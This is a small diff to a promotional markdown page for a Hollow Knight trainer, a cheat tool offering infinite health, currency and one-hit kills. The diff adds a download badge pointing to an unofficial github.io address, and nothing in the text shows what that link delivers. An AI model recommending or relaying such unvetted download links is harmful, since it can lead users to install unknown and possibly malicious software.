@@ -4,7 +4,7 @@
 
 **Hollow Knight** is a masterpiece of the metroidvania genre, but it’s also notoriously tough. Between brutal boss fights, farming geo for upgrades, and navigating massive maps, some players just want a smoother ride. That’s where a **Hollow Knight trainer** comes in – a tool that gives you **infinite health, geo, soul, and one-hit kill powers** to break the game wide open.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Trainer-blueviolet)](https://hollow-knight-trainer.github.io/.github/)
 ---
 
 ## What Is a Hollow Knight Trainer?
